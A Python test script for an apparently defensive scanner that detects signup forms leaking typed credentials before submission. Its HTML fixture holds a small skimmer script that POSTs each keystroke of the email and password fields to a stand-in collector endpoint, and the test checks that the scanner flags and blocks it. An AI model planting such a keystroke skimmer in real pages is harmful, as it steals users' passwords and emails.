#!/usr/bin/env python3
"""Exercise B-10 against a local page that attempts pre-submit exfiltration."""

from __future__ import annotations

import json
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from application_security.leaky_forms import (  # noqa: E402
    install_leaky_forms_observer,
    run_leaky_forms_safe_interaction,
)
from utils.util_test_password import _get_new_driver  # noqa: E402


HTML = """<!doctype html><html><body><form id='signup'>
<input type='email' autocomplete='email'><input type='password' autocomplete='new-password'>
<button type='submit'>Create account</button></form>
<script>
for(const el of document.querySelectorAll('input'))el.addEventListener('input',ev=>{
 const v=ev.target.value;
 fetch('http://localhost:9/collect',{method:'POST',body:v}).catch(()=>{});
});
</script></body></html>"""


class _Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        body = HTML.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, _format, *_args):
        return


def main() -> int:
    server = ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    driver = _get_new_driver()
    try:
        install_errors = install_leaky_forms_observer(driver)
        assert not install_errors
        driver.get("http://127.0.0.1:{}/signup".format(server.server_port))
        result = run_leaky_forms_safe_interaction(driver, "synthetic.local").to_dict()
    finally:
        driver.quit()
        server.shutdown()
        server.server_close()
        thread.join(timeout=2)
    claims = {item["metric_id"]: item for item in result["claims"]}
    leak = claims["auth.form_secret.network_exfiltration_attempt"]
    guard = claims["auth.form_secret.safe_interaction_guard"]
    assert leak["verdict"] == "fail"
    assert leak["value"]["third_party_attempt_count"] == 2
    assert leak["value"]["password_attempt_count"] == 1
    assert leak["value"]["email_attempt_count"] == 1
    assert leak["value"]["attempts_blocked"] is True
    assert guard["verdict"] == "pass"
    assert guard["value"]["form_submit_count"] == 0
    assert guard["value"]["forwarded_canary_count"] == 0
    encoded = json.dumps(result, ensure_ascii=False)
    assert "@example.invalid" not in encoded and "CS!" not in encoded
    print(json.dumps({"leak": leak, "guard": guard}, ensure_ascii=False, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
